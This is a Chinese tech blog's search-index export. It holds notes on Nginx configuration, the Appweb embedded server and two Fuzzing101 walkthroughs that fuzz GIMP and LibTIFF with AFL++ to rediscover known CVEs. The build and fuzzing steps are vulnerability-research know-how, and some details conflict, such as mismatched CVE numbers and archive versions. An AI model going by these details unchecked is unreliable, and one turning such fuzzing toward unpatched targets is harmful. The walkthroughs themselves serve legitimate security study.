设置sendfile最大数据量,此指令可以在http块、server块或location块中配置 # sendfile_max_chunk size; # 其中，size值如果大于0，Nginx进程的每个worker process每次调用sendfile()传输的数据量最大不能超过这个值(这里是128k，所以每次不能超过128k)；如果设置为0，则无限制。默认值为0。 # sendfile_max_chunk 128k; # 配置连接超时时间,此指令可以在http块、server块或location块中配置。 # 与用户建立会话连接后，Nginx服务器可以保持这些连接打开一段时间 # timeout，服务器端对连接的保持时间。默认值为75s;header_timeout，可选项，在应答报文头部的Keep-Alive域设置超时时间：“Keep-Alive:timeout= header_timeout”。报文中的这个指令可以被Mozilla或者Konqueror识别。 # keepalive_timeout timeout [header_timeout] # 下面配置的含义是，在服务器端保持连接的时间设置为120 s，发给用户端的应答报文头部中Keep-Alive域的超时时间设置为100 s。 # keepalive_timeout 120s 100s # 配置单连接请求数上限，此指令可以在http块、server块或location块中配置。 # Nginx服务器端和用户端建立会话连接后，用户端通过此连接发送请求。指令keepalive_requests用于限制用户通过某一连接向Nginx服务器发送请求的次数。默认是100 # keepalive_requests number; 4. server 块 server 块和 “虚拟主机” 的概念有密切联系。 虚拟主机，又称虚拟服务器、主机空间或是网页空间，它是一种技术。该技术是为了节省互联网服务器硬件成本而出现的。这里的 “主机” 或“空间”是由实体的服务器延伸而来，硬件系统可以基于服务器群，或者单个服务器等。虚拟主机技术主要应用","date":"2021-05-15","objectID":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/:2:2","tags":["nginx"],"title":"Nginx核心知识点记录","uri":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/"},{"categories":["Misc"],"content":"参考文献 Nginx 官网 操作系统能否支持百万连接? Nginx 系列博客 nginx 的 default_server 定义及匹配规则 W3C Nginx 教程 https://www.cnblogs.com/54chensongxia/p/12938929.html ","date":"2021-05-15","objectID":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/:3:0","tags":["nginx"],"title":"Nginx核心知识点记录","uri":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/"},{"categories":["Misc"],"content":"Appweb 学习笔记","date":"2021-05-14","objectID":"/2021/05/appweb-1/","tags":["appweb"],"title":"Appweb 学习笔记","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"Appweb Learning Notes ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:0:0","tags":["appweb"],"title":"Appweb 学习笔记","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"一、Appweb概述 Appweb是用于 Web 应用程序的嵌入式 Web 服务器。 它速度快，具备丰富的安全功能套件。 Appweb通过事件驱动的多线程内核托管对动态嵌入式 Web 应用程序进行了优化，可以提供快速响应、快速吞吐量和有效内存利用率。 它结构紧凑，只需使用 2MB 的内存（通常为 2-4MB）即可嵌入。 Appweb具有一组强大的功能，包括HTTP/1、HTTP/2、SSL/TLS、基本和摘要身份验证、虚拟主机、可加载模块、沙盒资源限制、日志记录、服务监控过程以及广泛的配置和编译控制。Appweb支持多种网络框架，包括ESP、PHP、Python、Perl 和 CGI。 作为部署最广泛的嵌入式 Web 服务器之一，Appweb被用于网络设备、电话、移动设备、消费和办公设备以及高速 Web 服务。 ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:1:0","tags":["appweb"],"title":"Appweb 学习笔记","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"二、Appweb的优势和特点 ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:2:0","tags":["appweb"],"title":"Appweb 学习笔记","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"1. 快速开发 创建动态设备管理应用程序的最简单且最具成本效益的方式。它具有嵌入式 Web 应用程序所需的所有功能，因此开发和发布后维护成本将显着降低。 ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:2:1","tags":["appweb"],"title":"Appweb 学习笔记","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"2. 最小资源需求 快速和紧凑（最小需求仅2MB）。它只占用很少的系统资源，因此可以将重要的系统资源用于运行应用程序。 ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:2:2","tags":["appweb"],"title":"Appweb 学习笔记","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"3. 灵活的开发环境 高度模块化，因此按照不同需求选择不同的功能。它支持运行时模块加载和广泛的编译时控制，这对于希望重新编译源码的开发者来说十分有用。 ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:2:3","tags":["appweb"],"title":"Appweb 学习笔记","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"4. 安全性和可靠性 部署最广泛的嵌入式 Web 服务器之一，拥有大量用户对代码进行测试和优化。它有一个广泛的回归测试套件，对产品的压力测试远远超过正常环境中可能遇到的限制。完善的SSL/TLS、身份验证、沙盒指令和防御性策略等功能可最大程度保护用户免受攻击。 ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:2:4","tags":["appweb"],"title":"Appweb 学习笔记","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"5. 性能 具有事件驱动、多线程内核的同类产品中最快的性能。Appweb使用基于 arena 的内存分配器来防止内存泄漏并提供最高性能，在 PC 类设备上每秒可以处理超过 40,000 个请求。 ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:2:5","tags":["appweb"],"title":"Appweb 学习笔记","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"6. 规范性 支持 HTTP/1.0、HTTP/1.1、HTTP/2（仅限企业版）、CGI/1.1、SSL RFC 2246、HTTP RFC 2617等协议标准。 ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:2:6","tags":["appweb"],"title":"Appweb 学习笔记","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"7. 可移植性 Appweb 已移植到 Linux、Windows、Mac OS 和 BSD，并支持以下 CPU 架构：ARM、MIPS、i386/X86/X86_64、PowerPC、SH 和 Sparc。 ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:2:7","tags":["appweb"],"title":"Appweb 学习笔记","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"三、嵌入式设备应用 在嵌入式设备或应用中，web server功能的重要性次于设备必须运行的功能。因此，web server 必须最大限度地减少其资源需求，并且确定它放置在系统上的负载。 Appweb 根据这种特性进行深度优化： 快速并且只占用很小的内存资源（通常为2-4MB） 对系统资源的需求最小——通过可配置的资源限制 ESP C Web 框架在不影响开发人员功能的情况下，运行时效率最高 默认安全，开发安全 ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:3:0","tags":["appweb"],"title":"Appweb 学习笔记","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"四、Appweb 内部组件 Appweb 的核心是一个事件驱动的、多线程的 HTTP pipe，在它上面加载模块以提供特定于内容的处理并扩展其功能。 Appweb 具有如下特点： 高性能多线程内核 动态模块加载的模块化结构 HTTP/1， HTTP/2 和WebSocket 支持 带有过滤器的灵活的请求pipeline 可以有效避免内存泄漏的快速的专用内存分配器和垃圾回收 可移植运行时 使用沙盒控制资源消耗 安全可靠的运行时可防止常见的安全漏洞，例如缓冲区溢出漏洞。 兼容Apache配置 全面的日志和调试跟踪 ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:4:0","tags":["appweb"],"title":"Appweb 学习笔记","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"1. Routing Engine 在现代 Web 应用程序中，一般需要根据功能对应用程序的不同部分进行划分，并对各个部分进行不同的处理。 例如可能只想将访问权限限制为经过身份验证的用户，或者希望缓存一些缓慢变化但动态的数据的输出，或者可能想要使用 RESTful URI（其中 URI 的含义取决于 HTTP method）。 原因有很多，但 Web 服务器必须提供一种方法来以不同方式处理各种 URI 的处理， Appweb 同样提供了路由引擎来处理该问题。 Appweb 具有高效灵活的路由引擎，允许以不同方式处理（路由）URI group。 路由在 appweb.conf 配置文件中创建，使用 Route 定义一组适用于 URI 组的处理指令。 Route 指令指定符合条件的请求所必须匹配的 URI 前缀，匹配策略可以是一个简单的字符串或正则表达式。 可以创建任意数量的路由，并按照它们在 appweb.conf 文件中定义的顺序进行处理。 路由也可以嵌套，以便内部路由继承外部路由块的定义。 当收到请求时，它会测试各种路由并选择最好的路由来处理请求。在此过程中，路由可能会根据需要重定向或重写请求。 一个常规的路由块如下所示： \u003cRoute /info\u003e # match request URIs that begin with \"/info/\" Documents \"${DOCUMENT_ROOT}/info\" AuthType basic example.com # Use basic authentication Require secure # Must be accessed over SSL Require ability edit # Authenticated users must have the edit ability LimitRequestBody 100k # Only requests less than 100K are accepted RequestTimeout 10secs # Request must complete in \u003c 10 seconds RequestParseTimeout 2secs # Denial-of-service protection \u003c/Route\u003e 路由块中的部分常用指令如下： SetHandler —处理请求的请求handler (CGI, ESP, EJS, PHP, …) Documents — 服务内容所在目录 AuthType — 认证协议：basic, digest or web form Cache — 如何缓存响应 Redirect — 响应重定向 AddLanguageDir — 多语言内容 Compress —处理压缩的响应 Methods — 允许的请求方法 Require — 要求的用户凭据、规则或属性等 Limit* — 安全沙箱限制 SSLCertificateFile — SSL 配置 更多内容可以阅读 Appweb Request Routing 和 Appweb Configuration Directives. ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:4:1","tags":["appweb"],"title":"Appweb 学习笔记","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"2. Pipeline Engine Appweb 具备一个高效的、零拷贝的请求pipeline来处理请求，并生成对应的响应，这包括队列算法、数据包、缓冲区和时间调度。pipeline 的结构高度定制化，使用sendfile、异步 I/O 和向量化、离散/聚合的方式写入网络，以避免在写入网络之前在单个缓冲区中昂贵的数据和标头聚合消耗。 Nginx 企业 Web 服务器将性能提升到一个新的水平并在许多站点中取代了 Apache。但是嵌入式 Web 服务器一般要比常规的 web server 的守护进程处理速度上慢得多。虽然拥有千兆字节的内存会有助于提高 Web 服务器的速度，但使用正确的架构和内部设计更为重要。 Appweb 使用了嵌入式 Web 服务器的最佳实践，使得在嵌入式环境中也能取得与 Nginx 相同的处理速度。 与 Nginx 一样，Appweb 使用非阻塞、基于事件的设计来异步处理请求，客户端的每个请求无需使用专有进程或线程。当请求待处理时，Appweb 使用事件来为请求提供服务。所以每个 worker 线程可能会被许多请求共享，这种机制确保了快速响应，同时消耗较少的资源。 Appweb 将基于事件的内核与高效的 pipeline 相结合。pipeline 包含一个对输入和输出的数据进行处理的阶段，该阶段主要包含了各种各样的过滤器，这些过滤器会对数据进行分块、排列、上传和缓存。为了节省内存，pipeline会以数据包的形式进行数据传输，而不进行数据复制，数据包有效地携带数据包头或尾，以便数据可以在不复制的情况下进行封包，这对于高效的 HTTP 分块至关重要。 pipeline 与网络通信并使用平台上可用的最有效的 I/O 原语。 Appweb 支持向量套接字写入、sendfile 和快速 O/S 事件机制，如 kqueue 和 epoll， 这种架构极大地提升了处理速度并Web 服务器的“体型”娇小。 ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:4:2","tags":["appweb"],"title":"Appweb 学习笔记","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"3. Authentication Framework Appweb 集成了一个完整的认证框架，其中包含： 用户登录登出机制 安全密码传输 灵活密码存储 用户凭据验证 控制特定用户或用户组对资源的访问 Appweb 提供了3种认证协议：basic， digest 以及 web-form。如果用户使用 web-form 输入登录凭据，Appweb 会自动转换为SSL传输以确保传输安全。密码将被加密保存在一个平面文件(flat file)中或者使用本机操作系统的密码机制。 用户通过身份认证后，将获得一组“属性”的授权，这些是通过 Appweb 基于角色的授权方案为每个用户配置的。每个路由（一组 URI）都可以配置为在授予用户访问权限之前需要某些“属性”。 Appweb 的认证架构主要包含以下2个组件： 认证用户名/密码存储 认证协议 1. 认证用户名/密码存储 Appweb 有3种存储密码的方法： app - Application (custom) Password Database config - Configuration Directives in the app web.conf system - System Password Database app存储是用户应用程序将密码存储在数据库或其他自定义的存储密码的地方，用户应用程序负责实现凭据验证回调。Appweb 将调用该回调来访问自定义密码存储并将提供的凭据与用户密码进行比较。如果有需要在运行时修改用户和密码的需求，该种存储方法为首选项。使用该方法需要使用httpSetAuthVerifyByName API 来注册回调函数，此时注册的回调可以应用于所有的路由；如果使用httpSetAuthVerify API 注册回调，则只能应用于具体的某一个路由。 config 存储通过 Appweb 配置文件中的User指令来管理密码，authpass程序创建密码，并在appweb.conf中进行定义。在不需要动态添加、删除或编辑用户名或密码时可以使用该种方法。 system存储则是使用系统密码数据库(e.g. /etc/password) 具体使用何种存储方式由AuthStore指令指定。例如： AuthStore system 创建密码 创建密码使用authpass程序，如果使用应用程序定义数据库存储，则AuthStore应该设置成app，authpass程序创建的密码会存储在应用程序数据库中。 authpass的命令格式如下： authpass [--cipher blowfish|md5] [--file auth.conf] [--password word] realm username roles... --file filename 选项指定认证文件名称，如果未指定，密码将打印在标准输出上。 authpass 程序还可以修改配置文件中的密码定义。 --cipher 选项指定用于散列/加密密码的密码。 默认为 MD5，，但blowfish更安全。 Blowfish 更适用于 Basic 和 Form 身份验证方案。 如果未使用 --password 选项，authpass 将提示输入密码。 realm定义了一组密码，并通过 AuthType 指令设置，通常设置为公司域或产品名称。 注：身份验证文件必须存储在 Documents 目录或任何提供内容的目录之外。 2. 认证协议 认证协议定义了如何从用户处捕获用户凭据并提供给Appweb，Appweb 提供了不同的认证协议： Application Authentication 应用程序身份验证使用特定于应用程序的方式来捕获用户名和密码。用户应用程序负责实现控制逻辑以捕获用户凭据并通过登录和注销过程重定向客户端。此协议最适用于使用服务器端 Web 框架（如 ESP）的应用程序。 Web Form Authentication 表单身份验证方案使用 HTML Web 表单让用户输入用户名和密码凭据，并使用 HTTP Post 请求将凭据提交给服务器进行验证。 使用此协议，可以通过AuthType 指令定义特定的登录和注销页面。 Appweb 管理登录/注销过程，如果身份验证成功，则会创建登录会话并将 cookie 返回到客户端的浏览器，包含 cookie 的后续请求将被自动验证并提供服务。 要配置表单身份验证，AuthType 指令需要额外的参数来管理登录序列，包括指定登录网页、登录服务 URL、注销服务 URL、验证后显示的目标页面和注销后显示的目标页面。 格式为： AuthType form realm Login-Page Login-Service Logout-Service Logged-In-Destination Logged-Out-Destination 该指令定义在登录序列期间使用的 URL。该指令根据这些 URL 的要求创建请求路由，允许未经身份验证的用户访问登录页面和登录服务。这些 AuthType 参数中的每一个都是可选的，可以指定为空字符串\"\"以省略。 例如： \u003cRoute ^/\u003e AuthType form example.com /public/login.html /login /logout //public/login.html \u003c/Route\u003e \u003cRoute ^/public/\u003e Profix /public Document public AuthType none \u003c/Route\u003e 此示例为所有请求启用表单身份验证，并将客户端浏览器重定向到/public/login.html，用户可以输入用户名和密码。登录网页应将用户名和密码提交给绑定到/login URL的登录服务。当需要注销时，客户端应向绑定到/logout URL的注销服务提交 HTTP POST 请求。AuthType 指令中的最后两个字段是客户端浏览器在登录和注销后将重定向到的目标 URL。第二个 /public 路由无需身份验证即可访问“public”目录下的文档。 Login-Service 是绑定到内部服务的 URL，用于接收用户名和密码并对用户进行身份验证。此服务期望使用输入字段“用户名”和“密码”通过 POST 数据提交用户名/密码。可以通过在 AuthType 指令中为 Login-Service指定空字符串\"\"来提供自定义的登录和注销服务。如果使用自定义的登录服务，则应该调用httpLogin以根据配置的密码存储验证用户。 Web Form 这是一个最小示例登录页面： \u003chtml\u003e\u003chead\u003e\u003ctitle\u003elogin.html\u003c/title\u003e\u003c/head\u003e \u003cbody\u003e \u003cp\u003ePlease log in\u003c/p\u003e \u003cform name=\"details\" method=\"post\" action=\"/auth/login\" \u003e username \u003cinput type=\"text\" name=\"username\" value=''\u003e\u003cbr/\u003e password \u003cinput type=\"password\" name=\"password\" value=''\u003e\u003cbr/\u003e \u003cinput type=\"submit\" name=\"submit\" value=\"OK\"\u003e \u003c/form\u003e \u003c/body\u003e \u003c/html\u003e 提交的两个字段必须命名为username和password以供“表单”身份验证方案使用。 如果登录尝试成功，客户端将收到包含会话 cookie 的响应，并将被重定向到目标 URL。如果目标 URL 包含一个referrer:前缀并且登录请求在 HTTP 标头中包含一个引用 URL，那么该引用 URL 将用作目标而不是硬连接目标。 注：“表单”身份验证机制以纯文本形式提交用户密码。为确保通信安全，应在使用 TLS/SSL 的安全连接上使用“表单”身份验证方案。 Basic Authentication Digest Authentication Basic 和 Digest 身份验证是 HTTP/1.1 RFC2616 规范定义的 HTTP 协议机制。因为它们在 HTTP 协议级别运行，所以功能简单，且灵活性差。当客户端尝试访问受保护的内容时，客户端的浏览器会显示一个通用弹出对话框以提示用户输入凭据。 应该只将基本和摘要式身份验证用作最后的手段。 Basic 和 Digest 身份验证标准使用弱密码，通过网络重复发送凭据，并且不够安全。基本身份验证在每个请求中以明文形式传输密码。摘要式身份验证使用弱 MD5 密码，并且两者都要求对所有请求使用 SSL 以确保最低限度的安全。此外，Basic 和 Digest 都不提供可靠的注销机制。注销适用于某些浏览器，但不适用于其他浏览器甚至同一浏览器的不同版本。 Appweb 身份验证框架十分全面，使开发人员不必将各个部分进行拼凑组合成一个认证方案。更为详细的内容可以参考Authentication。 3. web框架 如果使用 ESP、PHP 或其他 Web 框架，则不应将扩展的AuthType form指令与 URL 一起使用。这是因为这些 web 框架集成了登录工具，在 web 框架中使用起来更自然。扩展的 AuthType form指令适合使用静态网页的网站，因为它可以在登录期间无缝管理浏览器页面转换。使用 ESP Web 框架时，请选择使用AuthType app身份验证协议。 4. SSL加密 在考虑对发送或接收来自应用程序的敏感信息时，有两种基本的安全策略： 保证整个应用","date":"2021-05-14","objectID":"/2021/05/appweb-1/:4:3","tags":["appweb"],"title":"Appweb 学习笔记","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"4. Embedded Server Pages ESP web Framework 可以说是 Appweb 中最优秀的部分，它是一个典型的MVC框架，可以容易地创建快速、动态的web应用。ESP是一个基于C的web框架，但不像一般的C编码，ESP框架的web页面支持嵌入式C编码。甚至，它支持网页修改时动态透明的重新编译和重新加载。它还检测并自动重新编译修改后的 ESP 控制器（用 C 编写）。这使得 ESP 的行为就像一个脚本化的 Web 框架。 为了解决C语言常见的内存分配和内存泄漏问题，ESP 使用了垃圾回收器在请求处理完成后来自动释放内存。 ESP 框架提供了一个应用生成器、web 页面模板引擎、MVC 框架、 HTML 控制库和 API 扩展来创建 web 应用程序。 ESP 应用程序通常定义在一组目录中： cache — 缓存预编译的 ESP 控制器和页面 client — 客户端 web 页内容、图片、样式等 controllers — ESP 控制器方法 layouts — 主页面布局 db — 数据库和数据库迁移 可以使用以下命令来快速创建一个新的 ESP 应用程序： mkdir blog cd blog esp install esp-html-mvc 关于 ESP 框架的内容十分丰富，可以单独拿出来详细说明，给出官网文档 ESP Docs。 ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:4:4","tags":["appweb"],"title":"Appweb 学习笔记","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"五、安全性 web server 通常通过数量众多的安全测试来保证安全性，但是作用甚微，构建一个设计安全的 web server 远比通过测试保证安全的方式更有效。对于嵌入式 web server 更难保证安全性，因为要在低内存占用和不降低性能的前提下进行。 Appweb 通过使用一个安全的 Portable Runtime (MPR)， 从一开始就重点保证安全性。MPR 是一个跨平台层，它使得 Appweb 的超过97%的代码都是可移植的。它包括许多帮助创建安全应用的机制，比如它包括一个安全的字符串和缓冲区处理模块，以帮助消除困扰许多产品的缓冲区溢出问题。 ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:5:0","tags":["appweb"],"title":"Appweb 学习笔记","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"六、沙箱 Appweb 引入沙箱来严格控制对系统资源的占用。这意味着在严格控制的范围内运行 Web 服务器，以便请求错误不会影响系统操作。 Appweb 还针对几种常见的拒绝服务攻击进行了加固。 Appweb 根据不同需求可做如下配置： 限制内存使用并且不允许超过内存限制的预定义的数值 拒绝过大的请求 拒绝过长的URL 由指定的用户帐户或用户组运行 基于以上基础，Appweb 提供了 Secure Sockets Layer 和摘要认证以及防御策略。 ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:6:0","tags":["appweb"],"title":"Appweb 学习笔记","uri":"/2021/05/appweb-1/"},{"categories":["Fuzz"],"content":"Fuzzing 101 系列 note 6","date":"2021-01-18","objectID":"/2021/01/fuzzing101-6/","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/2021/01/fuzzing101-6/"},{"categories":["Fuzz"],"content":"本文是Fuzzing101系列第六篇，fuzz的对象为 GIMP 。 ","date":"2021-01-18","objectID":"/2021/01/fuzzing101-6/:0:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/2021/01/fuzzing101-6/"},{"categories":["Fuzz"],"content":"1. Basic Info Target CVES to find Time estimated Main topics GIMP CVE-2016-4994 7hous persistent mode CVE-2016-4994: Use-After-Free vulneratibily. ","date":"2021-01-18","objectID":"/2021/01/fuzzing101-6/:1:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/2021/01/fuzzing101-6/"},{"categories":["Fuzz"],"content":"2. Learning Target 使用 fuzz 的 persistent mode 对 interactive/GUI 应用程序进行fuzz ","date":"2021-01-18","objectID":"/2021/01/fuzzing101-6/:2:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/2021/01/fuzzing101-6/"},{"categories":["Fuzz"],"content":"3. Fuzzing ","date":"2021-01-18","objectID":"/2021/01/fuzzing101-6/:3:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/2021/01/fuzzing101-6/"},{"categories":["Fuzz"],"content":"1. Workflow 找到一种修改 GIMP 源码以启用 AFL++ 的 persistent mode 的有效的方法 创建一个 XCF 的语料库 对 XCF 文件格式创建 dictionary 开始fuzz，直到出现crash 使用造成crash的poc重现crash 修复漏洞 ","date":"2021-01-18","objectID":"/2021/01/fuzzing101-6/:3:1","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/2021/01/fuzzing101-6/"},{"categories":["Fuzz"],"content":"2. Solution 1. Download and build target 首先创建待 fuzz 的 GIMP 环境，进行编译待用。 这里首先要安装 GEGL 0.2(Generic Graphics Library)，使用源码编译： # install dependencies sudo apt install build-essential libatk1.0-dev libfontconfig1-dev libcairo2-dev libgudev-1.0-0 libdbus-1-dev libdbus-glib-1-dev libexif-dev libxfixes-dev libgtk2.0-dev python2.7-dev libpango1.0-dev libglib2.0-dev zlib1g-dev intltool libbabl-dev # download and uncompress wget https://download.gimp.org/pub/gegl/0.2/gegl-0.2.2.tar.bz2 tar xvf gegl-0.2.0.tar.bz2 \u0026\u0026 cd gegl-0.2.2 # modify the source code sed -i 's/CODEC_CAP_TRUNCATED/AV_CODEC_CAP_TRUNCATED/g' ./operations/external/ff-load.c sed -i 's/CODEC_FLAG_TRUNCATED/AV_CODEC_FLAG_TRUNCATED/g' ./operations/external/ff-load.c # build and install ./configure --enable-debug --disable-glibtest --without-vala --without-cairo --without-pango --without-pangocairo --without-gdk-pixbuf --without-lensfun --without-libjpeg --without-libpng --without-librsvg --without-openexr --without-sdl --without-libopenraw --without-jasper --without-graphviz --without-lua --without-libavformat --without-libv4l --without-libspiro --without-exiv2 --without-umfpack make -j$(nproc) sudo make install 然后，下载 GIMP 2.8.16，并进行编译安装： # download cd .. wget https://mirror.klaus-uwe.me/gimp/pub/gimp/v2.8/gimp-2.8.16.tar.bz2 tar xvf gimp-2.8.16.tar.bz2 \u0026\u0026 cd gimp-2.8.16/ # build and install CC=afl-clang-lto CXX=afl-clang-lto++ PKG_CONFIG_PATH=$PKG_CONFIG_PATH:$HOME/Desktop/Fuzz/training/fuzzing_gimp/gegl-0.2.2/ CFLAGS=\"-fsanitize=address\" CXXFLAGS=\"-fsanitize=address\" LDFLAGS=\"-fsanitize=address\" ./configure --disable-gtktest --disable-glibtest --disable-alsatest --disable-nls --without-libtiff --without-libjpeg --without-bzip2 --without-gs --without-libpng --without-libmng --without-libexif --without-aa --without-libxpm --without-webkit --without-librsvg --without-print --without-poppler --without-cairo-pdf --without-gvfs --without-libcurl --without-wmf --without-libjasper --without-alsa --without-gudev --disable-python --enable-gimp-console --without-mac-twain --without-script-fu --without-gudev --without-dbus --disable-mp --without-linux-input --without-xvfb-run --with-gif-compression=none --without-xmc --with-shm=none --enable-debug --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_gimp/gimp-2.8.16/install\" make -j$(nproc) make install 2. persistent mode 为了使用 AFL++ 的 persistent mode，我们需要对源码进行一定的修改： 第一种方案是修改 app.c 文件： 第二种方案是修改 xcf_load_invoker 函数： 这里我们直接采用第二种方案进行 patch。gimp-2.8.16/app/xcf/xcf.c 修改前内容如下： 补丁内容如下： --- ../xcf.c 2014-08-20 08:27:58.000000000 -0700 +++ ./app/xcf/xcf.c 2021-10-11 13:02:42.800831192 -0700 @@ -277,6 +277,10 @@ filename = g_value_get_string (\u0026args-\u003evalues[1]); +#ifdef __AFL_COMPILER + while(__AFL_LOOP(10000)){ +#endif + info.fp = g_fopen (filename, \"rb\"); if (info.fp) @@ -366,6 +370,12 @@ if (success) gimp_value_set_image (\u0026return_vals-\u003evalues[1], image); +#ifdef __AFL_COMPILER + } +#endif + + exit(0); + gimp_unset_busy (gimp); return return_vals; 使用上面的补丁修改 gimp-2.8.16/app/xcf/xcf.c 文件： patch gimp-2.8.16/app/xcf/xcf.c -i persistent.patch pacth 后的文件内容如下： 这样就可以实现 AFL++ 的 persistent mode。 3. Seed corpus creation 这里直接使用 SampleInput.xcf 做简单的语料样例。 4. Custom dictionary 这里直接使用AFL++提供的 xcf 的 dict 。 4. Fuzzing 执行 afl-fuzz ，采用并行方式进行fuzz: ASAN_OPTIONS=detect_leaks=0,abort_on_error=1,symbolize=0 afl-fuzz -i './afl_in' -o './afl_out' -D -t 100 -- ./gimp-2.8.16/app/gimp-console-2.8 --verbose -d -f @@ ","date":"2021-01-18","objectID":"/2021/01/fuzzing101-6/:3:2","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/2021/01/fuzzing101-6/"},{"categories":["Fuzz"],"content":"3. Crashes ","date":"2021-01-18","objectID":"/2021/01/fuzzing101-6/:3:3","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/2021/01/fuzzing101-6/"},{"categories":["Fuzz"],"content":"4. Triage ","date":"2021-01-18","objectID":"/2021/01/fuzzing101-6/:4:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/2021/01/fuzzing101-6/"},{"categories":["Fuzz"],"content":"5. Fix 官方的修复地址： https://gitlab.gnome.org/GNOME/gimp/-/commit/6d804bf9ae77bc86a0a97f9b944a129844df9395 后续将对该漏洞进行深入分析和补丁分析，待完善。 ","date":"2021-01-18","objectID":"/2021/01/fuzzing101-6/:5:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/2021/01/fuzzing101-6/"},{"categories":["Fuzz"],"content":"Fuzzing 101 系列 note 4","date":"2021-01-14","objectID":"/2021/01/fuzzing101-4/","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/2021/01/fuzzing101-4/"},{"categories":["Fuzz"],"content":"Fuzzing 101 – 4 本文是Fuzzing101系列第四篇，fuzz的对象为 LibTIFF 。 ","date":"2021-01-14","objectID":"/2021/01/fuzzing101-4/:0:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/2021/01/fuzzing101-4/"},{"categories":["Fuzz"],"content":"1. Basic Info Target CVES to find Time estimated Main topics LibTIFF CVE-2016-9297 3hous measure the code coverage data CVE-2017-13028: Out-of-bounds Read vulneratibily. ","date":"2021-01-14","objectID":"/2021/01/fuzzing101-4/:1:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/2021/01/fuzzing101-4/"},{"categories":["Fuzz"],"content":"2. Learning Target 什么是 Code Coverage，代码覆盖率 使用 LCOV 对代码覆盖率进行测量 如何通过代码覆盖率的优化提升Fuzzing性能 ","date":"2021-01-14","objectID":"/2021/01/fuzzing101-4/:2:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/2021/01/fuzzing101-4/"},{"categories":["Fuzz"],"content":"3. Fuzzing ","date":"2021-01-14","objectID":"/2021/01/fuzzing101-4/:3:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/2021/01/fuzzing101-4/"},{"categories":["Fuzz"],"content":"1. Workflow 开启 ASan 功能，对 LibTiff 库进行fuzz 分析 crash ，找到对应漏洞的 PoC 测量该 PoC 的代码覆盖率情况 修复漏洞 ","date":"2021-01-14","objectID":"/2021/01/fuzzing101-4/:3:1","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/2021/01/fuzzing101-4/"},{"categories":["Fuzz"],"content":"2. Solution 1. Download and build target 首先创建待 fuzz 的 LibTiff 环境，进行编译待用： cd $HOME/Desktop/Fuzz/training mkdir fuzzing_tiff \u0026\u0026 cd fuzzing_tiff/ # download and uncompress the target wget https://download.osgeo.org/libtiff/tiff-4.0.4.tar.gz tar -xzvf tiff-4.0.4.tar.gz # make and install libtiff cd tiff-4.0.4/ ./configure --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_tiff/install/\" --disable-shared make make install # test the target program $HOME/Desktop/Fuzz/training/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w $HOME/Desktop/Fuzz/training/fuzzing_tiff/tiff-4.0.4/test/images/palette-1c-1b.tiff 以上安装不报错的话，可以正常调用 LibTiff 库 ： 在上面的启动命令中，基本开启了软件的所有参数，这样有利于在进行fuzz时执行更多的代码路径，从而获得更高的代码覆盖率。 2. Seed corpus creation 直接使用 test/images 